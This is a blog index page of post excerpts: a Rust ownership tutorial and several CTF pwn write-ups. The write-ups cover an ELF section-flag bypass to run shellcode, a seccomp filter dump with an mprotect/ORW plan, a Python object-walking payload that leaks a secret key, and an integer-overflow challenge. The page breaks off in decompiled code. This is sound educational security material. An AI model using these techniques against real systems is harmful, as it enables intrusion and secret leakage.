<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>nyyyddddn<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		快来和我贴贴qaq

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/05/03/rust入门-数据所有权与生命周期管理/" >rust入门_数据所有权与生命周期管理</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-05-03  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h2><p>rust的数据类型分为两种，一种是实现了copy trait的数据类型如i32 u32，一种是没有实现copy trait的数据类型，如String，在进行变量间的赋值操作时，实现了copy trait类型的数据类型会将数据复制一份过去。而没有实现copy trait的数据类型则会将数据的所有权转移，先前对数据进行引用的符号的生命周期就结束了</p>
<p>e.g.</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> x<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> y <span class="token operator">=</span> x<span class="token punctuation">;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"x = &#123;&#125;, y = &#123;&#125;"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> s1 <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">::</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> s2 <span class="token operator">=</span> s1<span class="token punctuation">;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h2><p>rust的引用类型可分为可变引用和不可变引用，可以理解为编译期间进行严格生命周期及检查的”智能指针”，不可变引用对于数据只能做读的行为，可变引用可以做写的行为。使用引用可以在不转移所有权的情况下对对象进行读写操作。</p>
<p>使用方法 e.g</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> value <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
	<span class="token comment">// 不可变引用</span>
    <span class="token keyword">let</span> r1 <span class="token operator">=</span> <span class="token operator">&amp;</span>value<span class="token punctuation">;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> r1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 可变引用</span>
    <span class="token keyword">let</span> r2 <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> value<span class="token punctuation">;</span>
    <span class="token operator">*</span>r2 <span class="token operator">+=</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可变引用在进行写行为时需要显式解引用，这里相对c的指针来说有些差别</p>
<p>可变引用和不可变引用有严格的使用规定，同一作用域下 同一对象不能拥有两个可变引用，同一作用域下对于同一对象不能同时存在可变引用和不可变引用，通过对引用的使用进行限制来避免数据竞争。但这只是官方文档的说法，可以同一作用域下同时存在可变引用和不可变引用，以及多个可变引用，程序也可以编译成功，关键在于存在的情况下是否有使用可变引用，使用了就会编译错误。 </p>
	
	</div>
  <a type="button" href="/2025/05/03/rust入门-数据所有权与生命周期管理/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/04/29/hackergame2024复现/" >hackergame2024复现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-04-29  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="不宽的宽字符-general"><a href="#不宽的宽字符-general" class="headerlink" title="不宽的宽字符(general)"></a>不宽的宽字符(general)</h2><p>description</p>
<p>A 同学决定让他设计的 Windows 程序更加「国际化」一些，首先要做的就是读写各种语言写下的文件名。于是他放弃 C 语言中的 <code>char</code>，转而使用宽字符 <code>wchar_t</code>，显然这是一个国际化的好主意。</p>
<p>经过一番思考，他写出了下面这样的代码，用来读入文件名：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; Read the filename
std::wstring filename;
std::getline(std::wcin, filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>转换后要怎么打开文件呢？小 A 使用了 C++ 最常见的写法：</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; Create the file object and open the file specified
std::wifstream f(filename);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>可惜的是，某些版本的 C++ 编译器以及其自带的头文件中，文件名是 <code>char</code> 类型的，因此这并不正确。这时候小 A 灵光一闪，欸🤓👆，我为什么不做一个转换呢？于是：</p>
<pre class="line-numbers language-none"><code class="language-none">std::wifstream f((char*)filename);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>随便找了一个文件名测试过无误后，小 A 对自己的方案非常自信，大胆的在各个地方复用这段代码。然而，代价是什么呢？</p>
	
	</div>
  <a type="button" href="/2025/04/29/hackergame2024复现/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/04/09/Squ1rrelCTF/" >Squ1rrelCTF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-04-09  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Extremely-Lame-Filters-1"><a href="#Extremely-Lame-Filters-1" class="headerlink" title="Extremely Lame Filters 1"></a>Extremely Lame Filters 1</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python3</span>

<span class="token keyword">from</span> elf <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode

data <span class="token operator">=</span> b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"I'm a little fairy and I will trust any ELF that comes by!!"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> parse<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">for</span> section <span class="token keyword">in</span> elf<span class="token punctuation">.</span>sections<span class="token punctuation">:</span>
    <span class="token keyword">if</span> section<span class="token punctuation">.</span>sh_flags <span class="token operator">&amp;</span> SectionFlags<span class="token punctuation">.</span>EXECINSTR<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> ValidationException<span class="token punctuation">(</span><span class="token string">"!!"</span><span class="token punctuation">)</span>

elf<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man5/elf.5.html">https://www.man7.org/linux/man-pages/man5/elf.5.html</a></p>
<p>程序检查 elf中是否存在 sh_flags设置过execinstr标志位的section来判断是否存在有可执行权限的段，但实际上段的权限和program header的p_flags标志位有关，所以可以通过修改sh_flags以及p_flags的值去绕过上面的检查执行shellcode</p>
<p>program_header_table是一个描述程序的每个段如何加载到内存的表，它定义了进程运行时内存布局</p>
<p>program_header_table的位置可以通过elf_header中PHT的偏移找到</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lhj@lhj-virtual-machine:~/Desktop/squ1rrel/Extremely Lame Filters <span class="token number">1</span>$ readelf <span class="token parameter variable">-a</span> shellcode
ELF Header:
  Magic:   7f <span class="token number">45</span> 4c <span class="token number">46</span> 02 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF64
  Data:                              <span class="token number">2</span>'s complement, little endian
  Version:                           <span class="token number">1</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span>
  OS/ABI:                            UNIX - System V
  ABI Version:                       <span class="token number">0</span>
  Type:                              EXEC <span class="token punctuation">(</span>Executable <span class="token function">file</span><span class="token punctuation">)</span>
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x401000
  Start of program headers:          <span class="token number">64</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>
  Start of section headers:          <span class="token number">4336</span> <span class="token punctuation">(</span>bytes into <span class="token function">file</span><span class="token punctuation">)</span>
  Flags:                             0x0
  Size of this header:               <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Size of program headers:           <span class="token number">56</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Number of program headers:         <span class="token number">2</span>
  Size of section headers:           <span class="token number">64</span> <span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
  Number of section headers:         <span class="token number">5</span>
  Section header string table index: <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>成员的结构如下 每个成员的解释可以在man7中找到 <a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man5/elf.5.html">https://www.man7.org/linux/man-pages/man5/elf.5.html</a></p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint32_t</span>   p_type<span class="token punctuation">;</span>
    <span class="token class-name">uint32_t</span>   p_flags<span class="token punctuation">;</span>
    Elf64_Off  p_offset<span class="token punctuation">;</span>
    Elf64_Addr p_vaddr<span class="token punctuation">;</span>
    Elf64_Addr p_paddr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span>   p_filesz<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span>   p_memsz<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span>   p_align<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> Elf64_Phdr<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2025/04/09/Squ1rrelCTF/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/01/27/x3ctf/" >x3ctf</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-01-27  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="devnull-as-a-service"><a href="#devnull-as-a-service" class="headerlink" title="devnull-as-a-service"></a>devnull-as-a-service</h2><p>description</p>
<p>A few months ago, I came across <a target="_blank" rel="noopener" href="https://devnull-as-a-service.com/">this</a> website. Inspired by it, I decided to recreate the service in C to self-host it.<br> To avoid any exploitable vulnerabilities, I decided to use a very strict seccomp filter. Even if my code were vulnerable, good luck exploiting  it.<br> PS: You can find the flag at <code>/home/ctf/flag.txt</code> on the remote server.</p>
<p>程序逻辑很简单，gets栈溢出，静态链接没有pie但是开启了seccomp</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">dev_null</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
__int64 <span class="token function">dev_null</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[/dev/null as a service] Send us anything, we won't do anything with it."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">enable_seccomp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>seccomp规则，可以使用openat代替open然后read wrtie将flag读出来</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> line  CODE  JT   JF      K
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch
 0001: 0x15 0x00 0x1c 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0030
 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005
 0004: 0x15 0x00 0x19 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0030
 0005: 0x15 0x18 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0030
 0006: 0x15 0x17 0x00 0x00000003  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> close<span class="token punctuation">)</span> goto 0030
 0007: 0x15 0x16 0x00 0x00000012  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pwrite64<span class="token punctuation">)</span> goto 0030
 0008: 0x15 0x15 0x00 0x00000014  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> writev<span class="token punctuation">)</span> goto 0030
 0009: 0x15 0x14 0x00 0x00000016  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pipe<span class="token punctuation">)</span> goto 0030
 0010: 0x15 0x13 0x00 0x00000020  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup<span class="token punctuation">)</span> goto 0030
 0011: 0x15 0x12 0x00 0x00000021  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup2<span class="token punctuation">)</span> goto 0030
 0012: 0x15 0x11 0x00 0x00000028  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sendfile<span class="token punctuation">)</span> goto 0030
 0013: 0x15 0x10 0x00 0x00000029  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> socket<span class="token punctuation">)</span> goto 0030
 0014: 0x15 0x0f 0x00 0x0000002c  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sendto<span class="token punctuation">)</span> goto 0030
 0015: 0x15 0x0e 0x00 0x0000002e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> sendmsg<span class="token punctuation">)</span> goto 0030
 0016: 0x15 0x0d 0x00 0x00000031  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token builtin class-name">bind</span><span class="token punctuation">)</span> goto 0030
 0017: 0x15 0x0c 0x00 0x00000038  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> clone<span class="token punctuation">)</span> goto 0030
 0018: 0x15 0x0b 0x00 0x00000039  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> fork<span class="token punctuation">)</span> goto 0030
 0019: 0x15 0x0a 0x00 0x0000003a  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> vfork<span class="token punctuation">)</span> goto 0030
 0020: 0x15 0x09 0x00 0x0000003b  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execve<span class="token punctuation">)</span> goto 0030
 0021: 0x15 0x08 0x00 0x00000065  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> ptrace<span class="token punctuation">)</span> goto 0030
 0022: 0x15 0x07 0x00 0x00000113  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> splice<span class="token punctuation">)</span> goto 0030
 0023: 0x15 0x06 0x00 0x00000114  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">tee</span><span class="token punctuation">)</span> goto 0030
 0024: 0x15 0x05 0x00 0x00000124  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup3<span class="token punctuation">)</span> goto 0030
 0025: 0x15 0x04 0x00 0x00000125  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pipe2<span class="token punctuation">)</span> goto 0030
 0026: 0x15 0x03 0x00 0x00000128  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> pwritev<span class="token punctuation">)</span> goto 0030
 0027: 0x15 0x02 0x00 0x00000137  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> process_vm_writev<span class="token punctuation">)</span> goto 0030
 0028: 0x15 0x01 0x00 0x00000142  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> execveat<span class="token punctuation">)</span> goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
 0030: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是程序中找不到syscall ;ret 这类gadget，需要连续三次系统调用，想了一下直接用mprotect将bss的权限改成r | w | x的，往里面写orw_assemble直接跳过去就好了</p>
<p>exp</p>
	
	</div>
  <a type="button" href="/2025/01/27/x3ctf/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2025/01/27/KnightCTF/" >KnightCTF</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2025-01-27  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><p>嘛，因为学校那边的事情，好久没有打ctf了，找个beginner难度的ctf热身一下</p>
<h2 id="Knight’s-Secret"><a href="#Knight’s-Secret" class="headerlink" title="Knight’s Secret"></a>Knight’s Secret</h2><p>pyjail?? 题目自定义了一个person类，可以访问person类的属性，方法。题目目标只需要获取程序环境中的key，通过内置方法 mro返回的继承链数组来获取object对象，拿到object对象后就可以通过globals内置方法去检索程序中有的属性 方法拿到key</p>
<p>exp</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Enter your secret: <span class="token punctuation">&#123;</span>person_obj.__class__.__mro__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.__init__.__globals__<span class="token punctuation">&#125;</span>
Output: <span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token builtin class-name">:</span> <span class="token string">'__main__'</span>, <span class="token string">'__doc__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'__package__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'__loader__'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>_frozen_importlib_external.SourceFileLoader object at 0x76a7e6a7b92<span class="token operator"><span class="token file-descriptor important">0</span>></span>, <span class="token string">'__spec__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'__annotations__'</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>, <span class="token string">'__builtins__'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>module <span class="token string">'builtins'</span> <span class="token punctuation">(</span>built-in<span class="token punctuation">)</span><span class="token operator">></span>, <span class="token string">'__file__'</span><span class="token builtin class-name">:</span> <span class="token string">'/challenge/challenge.py'</span>, <span class="token string">'__cached__'</span><span class="token builtin class-name">:</span> None, <span class="token string">'CONFIG'</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token string">'KEY'</span><span class="token builtin class-name">:</span> <span class="token string">'_KNIGHTSECRET2025_'</span><span class="token punctuation">&#125;</span>, <span class="token string">'Person'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>class <span class="token string">'__main__.Person'</span><span class="token operator">></span>, <span class="token string">'fun'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>function fun at 0x76a7e6a6234<span class="token operator"><span class="token file-descriptor important">0</span>></span>, <span class="token string">'main'</span><span class="token builtin class-name">:</span> <span class="token operator">&lt;</span>function main at 0x76a7e6840d6<span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h2 id="Knight-Bank"><a href="#Knight-Bank" class="headerlink" title="Knight Bank"></a>Knight Bank</h2><p>整数溢出，让uint溢出就好了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  v5 <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Welcome to the Knight Bank!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Your current balance is: %u\n"</span><span class="token punctuation">,</span> <span class="token number">1000LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter the amount you want to withdraw: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">&lt;=</span> <span class="token number">0xF4240</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      v5 <span class="token operator">-=</span> v4<span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You withdrew %u. Your new balance is %u.\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">0xF4240</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Better luck next time!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
